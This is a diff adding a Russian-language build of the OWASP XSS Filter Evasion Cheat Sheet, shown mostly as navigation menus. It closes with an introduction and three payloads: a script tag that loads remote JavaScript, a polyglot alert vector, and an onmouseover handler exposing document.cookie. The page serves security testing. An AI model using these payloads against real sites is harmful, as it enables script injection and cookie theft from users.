+          <li class="md-nav__item">
+  <a href="#ip" class="md-nav__link">
+    <span class="md-ellipsis">
+      IP вместо имени хоста
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#url-_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      URL-кодирование
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dword-" class="md-nav__link">
+    <span class="md-ellipsis">
+      DWORD-кодирование
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      Шестнадцатеричное кодирование
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      Восьмеричное кодирование
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#base64-" class="md-nav__link">
+    <span class="md-ellipsis">
+      Base64-кодирование
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    <span class="md-ellipsis">
+      Смешанное кодирование
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    <span class="md-ellipsis">
+      Обход разрешения протокола
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cname" class="md-nav__link">
+    <span class="md-ellipsis">
+      Удаление CNAME
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#javascript" class="md-nav__link">
+    <span class="md-ellipsis">
+      Расположение ссылки в JavaScript
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    <span class="md-ellipsis">
+      Замена содержимого как вектор атаки
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xss-http-parameter-pollution" class="md-nav__link">
+    <span class="md-ellipsis">
+      Содействие XSS с помощью HTTP Parameter Pollution
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Содействие XSS с помощью HTTP Parameter Pollution">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#content" class="md-nav__link">
+    <span class="md-ellipsis">
+      Исходный код страницы Content
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#share" class="md-nav__link">
+    <span class="md-ellipsis">
+      Исходный код страницы Share
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#content_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Вывод страницы Content
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#share_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Вывод страницы Share
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    <span class="md-ellipsis">
+      Последовательности экранирования символов
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#waf" class="md-nav__link">
+    <span class="md-ellipsis">
+      Методы обхода WAF – межсайтовый скриптинг
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Методы обхода WAF – межсайтовый скриптинг">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_14" class="md-nav__link">
+    <span class="md-ellipsis">
+      Общие проблемы
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Общие проблемы">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#xss_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Хранимый XSS
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xss-javascript" class="md-nav__link">
+    <span class="md-ellipsis">
+      Отражённый XSS в JavaScript
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dom-based-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      DOM-based XSS
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xss_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      XSS через перенаправление запроса
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#waf-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      Строки для обхода WAF при XSS
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#alert_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Обфускация alert для обхода фильтров
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Zero_Trust_Architecture_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Архитектура Zero Trust
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Введение
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      Тесты
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Тесты">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#xss-" class="md-nav__link">
+    <span class="md-ellipsis">
+      Базовый XSS-тест без обхода фильтров
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xss-locator" class="md-nav__link">
+    <span class="md-ellipsis">
+      XSS Locator (полиглот)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#a" class="md-nav__link">
+    <span class="md-ellipsis">
+      Некорректные теги A
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#img" class="md-nav__link">
+    <span class="md-ellipsis">
+      Некорректные теги IMG
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fromcharcode" class="md-nav__link">
+    <span class="md-ellipsis">
+      fromCharCode
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#src-src" class="md-nav__link">
+    <span class="md-ellipsis">
+      Тег SRC по умолчанию для обхода фильтров, проверяющих домен SRC
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#src" class="md-nav__link">
+    <span class="md-ellipsis">
+      Тег SRC по умолчанию с пустым значением
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#src_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Тег SRC по умолчанию полностью без значения
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#alert" class="md-nav__link">
+    <span class="md-ellipsis">
+      Alert при ошибке
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#img-onerror-javascript-alert" class="md-nav__link">
+    <span class="md-ellipsis">
+      IMG onerror с кодированием JavaScript Alert
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#html-" class="md-nav__link">
+    <span class="md-ellipsis">
+      Десятичные HTML-ссылки на символы
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#html-_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Десятичные HTML-ссылки на символы без завершающей точки с запятой
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#html-_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      Шестнадцатеричные HTML-ссылки на символы без завершающей точки с запятой
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      Встроенная табуляция
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      Встроенная закодированная табуляция
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      Встроенный перевод строки для разрыва XSS
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Встроенный перевод строки для разрыва XSS">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-xss-" class="md-nav__link">
+    <span class="md-ellipsis">
+      Пример 1: разрыв XSS-атаки с помощью встроенного возврата каретки
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-javascript-" class="md-nav__link">
+    <span class="md-ellipsis">
+      Пример 2: разрыв JavaScript-директивы с помощью нулевого символа
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-javascript-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      Пример 3: пробелы и мета-символы перед JavaScript в изображениях для XSS
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-xss-" class="md-nav__link">
+    <span class="md-ellipsis">
+      Пример 4: XSS без буквенно-цифровых символов
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      Лишние открывающие угловые скобки
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#script" class="md-nav__link">
+    <span class="md-ellipsis">
+      Отсутствие закрывающих тегов script
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#script_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Разрешение протокола в тегах script
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#htmljavascript-xss-" class="md-nav__link">
+    <span class="md-ellipsis">
+      Полуоткрытый HTML/JavaScript XSS-вектор
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#javascript-" class="md-nav__link">
+    <span class="md-ellipsis">
+      Экранирование JavaScript-экранирования
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#title" class="md-nav__link">
+    <span class="md-ellipsis">
+      Закрывающий тег TITLE
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Закрывающий тег TITLE">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#input-image" class="md-nav__link">
+    <span class="md-ellipsis">
+      INPUT Image
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#body-image" class="md-nav__link">
+    <span class="md-ellipsis">
+      BODY Image
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#img-dynsrc" class="md-nav__link">
+    <span class="md-ellipsis">
+      IMG Dynsrc
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#img-lowsrc" class="md-nav__link">
+    <span class="md-ellipsis">
+      IMG Lowsrc
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#list-style-image" class="md-nav__link">
+    <span class="md-ellipsis">
+      List-style-image
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#vbscript" class="md-nav__link">
+    <span class="md-ellipsis">
+      VBscript в изображении
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#svg-object" class="md-nav__link">
+    <span class="md-ellipsis">
+      Тег SVG Object
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ecmascript-6" class="md-nav__link">
+    <span class="md-ellipsis">
+      ECMAScript 6
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#body" class="md-nav__link">
+    <span class="md-ellipsis">
+      Тег BODY
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Тег BODY">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      Атаки с использованием обработчиков событий
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bgsound" class="md-nav__link">
+    <span class="md-ellipsis">
+      BGSOUND
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#javascript-includes" class="md-nav__link">
+    <span class="md-ellipsis">
+      &amp; JavaScript includes
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#style-sheet" class="md-nav__link">
+    <span class="md-ellipsis">
+      STYLE sheet
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      Удалённая таблица стилей
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Удалённая таблица стилей">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#2" class="md-nav__link">
+    <span class="md-ellipsis">
+      Удалённая таблица стилей, часть 2
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3" class="md-nav__link">
+    <span class="md-ellipsis">
+      Удалённая таблица стилей, часть 3
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#style-javascript-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      Теги STYLE, разрывающие JavaScript для XSS
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#style" class="md-nav__link">
+    <span class="md-ellipsis">
+      Атрибут STYLE, разрывающий выражение
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#img-style" class="md-nav__link">
+    <span class="md-ellipsis">
+      IMG STYLE с выражениями
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#style-background-image" class="md-nav__link">
+    <span class="md-ellipsis">
+      Тег STYLE с использованием Background-image
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#style-background" class="md-nav__link">
+    <span class="md-ellipsis">
+      Тег STYLE с использованием Background
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#html-style" class="md-nav__link">
+    <span class="md-ellipsis">
+      Анонимный HTML с атрибутом STYLE
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#htc-" class="md-nav__link">
+    <span class="md-ellipsis">
+      Локальный htc-файл
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#us-ascii" class="md-nav__link">
+    <span class="md-ellipsis">
+      US-ASCII кодирование
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#meta" class="md-nav__link">
+    <span class="md-ellipsis">
+      META
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="META">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#meta-data" class="md-nav__link">
+    <span class="md-ellipsis">
+      META с использованием Data
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#meta-url" class="md-nav__link">
+    <span class="md-ellipsis">
+      META с дополнительным параметром URL
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#iframe" class="md-nav__link">
+    <span class="md-ellipsis">
+      IFRAME
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#iframe_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      IFRAME на основе событий
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#frame" class="md-nav__link">
+    <span class="md-ellipsis">
+      FRAME
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#table" class="md-nav__link">
+    <span class="md-ellipsis">
+      TABLE
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="TABLE">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#td" class="md-nav__link">
+    <span class="md-ellipsis">
+      TD
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#div" class="md-nav__link">
+    <span class="md-ellipsis">
+      DIV
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="DIV">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#div-background-image" class="md-nav__link">
+    <span class="md-ellipsis">
+      DIV Background-image
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#div-background-image-unicode-xss-" class="md-nav__link">
+    <span class="md-ellipsis">
+      DIV Background-image с Unicode XSS-эксплойтом
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#div-background-image_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      DIV Background-image с дополнительными символами
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#div-expression" class="md-nav__link">
+    <span class="md-ellipsis">
+      DIV Expression
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#downlevel" class="md-nav__link">
+    <span class="md-ellipsis">
+      Скрытый блок Downlevel
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#base" class="md-nav__link">
+    <span class="md-ellipsis">
+      Тег BASE
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#object" class="md-nav__link">
+    <span class="md-ellipsis">
+      Тег OBJECT
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#embed-svg-xss-" class="md-nav__link">
+    <span class="md-ellipsis">
+      EMBED SVG с XSS-вектором
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xml-data-island-cdata" class="md-nav__link">
+    <span class="md-ellipsis">
+      XML Data Island с обфускацией CDATA
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xml-javascript-xml-data-island" class="md-nav__link">
+    <span class="md-ellipsis">
+      Локально размещённый XML со встроенным JavaScript, генерируемым с помощью XML data island
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#htmltime-xml" class="md-nav__link">
+    <span class="md-ellipsis">
+      HTML+TIME в XML
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#js" class="md-nav__link">
+    <span class="md-ellipsis">
+      При ограничении в несколько символов и фильтрации против .js
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ssi-server-side-includes" class="md-nav__link">
+    <span class="md-ellipsis">
+      SSI (Server Side Includes)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#php" class="md-nav__link">
+    <span class="md-ellipsis">
+      PHP
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#img_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      IMG со встроенными командами
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="IMG со встроенными командами">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#img-ii" class="md-nav__link">
+    <span class="md-ellipsis">
+      IMG со встроенными командами, часть II
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cookie-manipulation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Cookie Manipulation
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xss-html-" class="md-nav__link">
+    <span class="md-ellipsis">
+      XSS с использованием инкапсуляции HTML-кавычек
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#url-" class="md-nav__link">
+    <span class="md-ellipsis">
+      Обход URL-строки
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Обход URL-строки">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ip" class="md-nav__link">
+    <span class="md-ellipsis">
+      IP вместо имени хоста
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#url-_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      URL-кодирование
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dword-" class="md-nav__link">
+    <span class="md-ellipsis">
+      DWORD-кодирование
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      Шестнадцатеричное кодирование
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      Восьмеричное кодирование
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#base64-" class="md-nav__link">
+    <span class="md-ellipsis">
+      Base64-кодирование
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    <span class="md-ellipsis">
+      Смешанное кодирование
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    <span class="md-ellipsis">
+      Обход разрешения протокола
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cname" class="md-nav__link">
+    <span class="md-ellipsis">
+      Удаление CNAME
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#javascript" class="md-nav__link">
+    <span class="md-ellipsis">
+      Расположение ссылки в JavaScript
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    <span class="md-ellipsis">
+      Замена содержимого как вектор атаки
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xss-http-parameter-pollution" class="md-nav__link">
+    <span class="md-ellipsis">
+      Содействие XSS с помощью HTTP Parameter Pollution
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Содействие XSS с помощью HTTP Parameter Pollution">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#content" class="md-nav__link">
+    <span class="md-ellipsis">
+      Исходный код страницы Content
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#share" class="md-nav__link">
+    <span class="md-ellipsis">
+      Исходный код страницы Share
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#content_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Вывод страницы Content
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#share_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Вывод страницы Share
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    <span class="md-ellipsis">
+      Последовательности экранирования символов
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#waf" class="md-nav__link">
+    <span class="md-ellipsis">
+      Методы обхода WAF – межсайтовый скриптинг
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Методы обхода WAF – межсайтовый скриптинг">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_14" class="md-nav__link">
+    <span class="md-ellipsis">
+      Общие проблемы
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Общие проблемы">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#xss_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Хранимый XSS
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xss-javascript" class="md-nav__link">
+    <span class="md-ellipsis">
+      Отражённый XSS в JavaScript
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dom-based-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      DOM-based XSS
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xss_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      XSS через перенаправление запроса
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#waf-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      Строки для обхода WAF при XSS
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#alert_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Обфускация alert для обхода фильтров
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  
+  
+
+
+<h1 id="xss-filter-evasion-cheat-sheet">XSS Filter Evasion Cheat Sheet<a class="headerlink" href="#xss-filter-evasion-cheat-sheet" title="Permanent link">&para;</a></h1>
+<h2 id="_1">Введение<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>Эта статья является руководством по тестированию межсайтового скриптинга (XSS) для специалистов в области безопасности приложений. Данная шпаргалка изначально была основана на основополагающей XSS Cheat Sheet от RSnake, ранее располагавшейся по адресу: <code>http://ha.ckers.org/xss.html</code>. Теперь OWASP Cheat Sheet Series предоставляет пользователям обновлённую и поддерживаемую версию этого документа. Самая первая шпаргалка OWASP, <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">Cross Site Scripting Prevention</a>, была вдохновлена работой RSnake, и мы благодарим RSnake за это вдохновение!</p>
+<h2 id="_2">Тесты<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>Данная шпаргалка демонстрирует, что фильтрация входных данных является неполноценной защитой от XSS, предоставляя тестировщикам набор XSS-атак, способных обойти определённые защитные фильтры.</p>
+<h3 id="xss-">Базовый XSS-тест без обхода фильтров<a class="headerlink" href="#xss-" title="Permanent link">&para;</a></h3>
+<p>Эта атака, использующая стандартное внедрение JavaScript через XSS, служит точкой отсчёта для данной шпаргалки (кавычки не требуются ни в одном современном браузере, поэтому здесь они опущены):</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">SCRIPT</span> <span class="na">SRC</span><span class="o">=</span><span class="s">https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js</span><span class="p">&gt;&lt;/</span><span class="nt">SCRIPT</span><span class="p">&gt;</span>
+</code></pre></div>
+<h3 id="xss-locator">XSS Locator (полиглот)<a class="headerlink" href="#xss-locator" title="Permanent link">&para;</a></h3>
+<p>Этот тест содержит «полиглот-пейлоад для XSS», который выполняется в нескольких контекстах, включая HTML, строки скриптов, JavaScript и URL:</p>
+<div class="highlight"><pre><span></span><code><span class="nx">javascript</span><span class="o">:</span><span class="cm">/*--&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script&gt;&lt;/xmp&gt;</span>
+<span class="cm">&lt;svg/onload=&#39;+/&quot;`/+/onmouseover=1/+/[*/</span><span class="p">[]</span><span class="o">/+</span><span class="nx">alert</span><span class="p">(</span><span class="mf">42</span><span class="p">);</span><span class="c1">//&#39;&gt;</span>
+</code></pre></div>
+<p>(Основано на этом <a href="https://twitter.com/garethheyes/status/997466212190781445">твите</a> от <a href="https://twitter.com/garethheyes">Gareth Heyes</a>).</p>
+<h3 id="a">Некорректные теги A<a class="headerlink" href="#a" title="Permanent link">&para;</a></h3>
+<p>Этот тест пропускает атрибут <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/a#href"><code>href</code></a>, чтобы продемонстрировать XSS-атаку с использованием обработчиков событий:</p>
+<div class="highlight"><pre><span></span><code><span class="err">\</span><span class="o">&lt;</span><span class="nx">a</span><span class="w"> </span><span class="nx">onmouseover</span><span class="o">=</span><span class="s2">&quot;alert(document.cookie)&quot;</span><span class="err">\</span><span class="o">&gt;</span><span class="nx">xxs</span><span class="w"> </span><span class="nx">link</span><span class="err">\</span><span class="o">&lt;</span><span class="err">/a\&gt;</span>
+</code></pre></div>
